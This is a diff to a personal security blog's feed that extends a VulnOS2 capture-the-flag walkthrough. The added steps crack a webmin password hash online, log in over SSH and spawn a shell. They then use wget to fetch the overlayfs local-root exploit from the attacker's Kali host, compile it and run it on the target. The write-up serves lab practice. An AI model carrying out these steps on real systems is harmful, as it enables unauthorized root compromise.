@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-07-20T15:20:18-05:00</updated>
+  <updated>2016-07-20T16:23:29-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -32,6 +32,12 @@
 
 
 <h3>Vulnerability:</h3>
+
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/32075/">OpenDocMan 1.2.7 - Multiple Vulnerabilities</a></li>
+<li><a href="https://www.exploit-db.com/exploits/37293/">Linux Kernel 3.13.0 &lt; 3.19 &lsquo;overlayfs&rsquo; Local Root Shell</a></li>
+</ul>
+
 
 <!--more-->
 
@@ -127,6 +133,55 @@
 <p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
 
 <p>only guest&rsquo;s password is cracked.</p>
+
+<p>Find a very good website to crack MD5 online <a href="http://md5cracker.org/,">http://md5cracker.org/,</a> get the cracked password <code>webmin1980</code> for user webmin, and login:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>not very helpful.</p>
+
+<p>Try to ssh to the box using webmin</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the bash:</p>
+
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p>first check the os version</p>
+
+<p><code>uname -a</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>searchsploit 3.13.0</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>try this exploit</p>
+
+<p>in Kali:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cp /usr/share/exploitdb/platforms/linux/local/37292.c /var/www/html/.
+</span><span class='line'>service apache2 restart
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>in target:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget http://192.168.56.101/37292.c .
+</span><span class='line'>gcc 37292.c -o 37292
+</span><span class='line'>./37292</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE</p>
 ]]></content>
   </entry>
   
